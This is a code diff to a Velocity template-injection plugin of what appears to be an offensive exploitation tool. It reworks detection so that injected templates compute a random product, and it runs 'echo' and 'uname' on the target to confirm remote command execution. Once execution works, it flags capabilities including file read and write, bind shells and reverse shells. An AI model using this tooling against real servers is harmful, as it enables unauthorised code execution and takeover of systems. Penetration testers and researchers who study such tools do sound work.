@@ -11,7 +11,14 @@ class Velocity(Plugin):
         'render' : {
             'render': '#set($c=%(code)s)\n${c}\n',
             'header': '\n#set($h=%(header)s)\n${h}\n',
-            'trailer': '\n#set($t=%(trailer)s)\n${t}\n'
+            'trailer': '\n#set($t=%(trailer)s)\n${t}\n',
+            'render_test': '%(n1)s*%(n2)s' % { 
+                'n1' : rand.randints[0], 
+                'n2' : rand.randints[1]
+            },
+            'render_expected': '%(res)s' % { 
+                'res' : rand.randints[0]*rand.randints[1] 
+            }
         },
         'write' : {
             'call' : 'inject',
@@ -125,33 +132,20 @@ ${output}
 
     def rendered_detected(self):
 
-        payload = 'a#* comm *#a'
-
-        if 'aa' == self.render(payload):
-
-            # Since the render format is pretty peculiar assume
-            # engine name if render has been detected.
-            self.set('engine', self.plugin.lower())
-            self.set('language', self.language)
-
-            expected_rand = str(rand.randint_n(2))
-            if expected_rand == self.execute('echo %s' % expected_rand):
-                
-                self.set('execute', True)
-                self.set('write', True)
-                self.set('read', True)
-                self.set('bind_shell', True)
-                self.set('reverse_shell', True)
-                
-                os = self.execute("""uname""")
-                if os and re.search('^[\w-]+$', os):
-                    self.set('os', os)
+        expected_rand = str(rand.randint_n(2))
+        if expected_rand == self.execute('echo %s' % expected_rand):
+            
+            self.set('execute', True)
+            self.set('write', True)
+            self.set('read', True)
+            self.set('bind_shell', True)
+            self.set('reverse_shell', True)
+            
+            os = self.execute("""uname""")
+            if os and re.search('^[\w-]+$', os):
+                self.set('os', os)
 
     def blind_detected(self):
-
-        self.set('engine', self.plugin.lower())
-        self.set('language', self.language)
-
         # No blind code evaluation is possible here, only execution
 
         # Since execution has been used to detect blind injection,
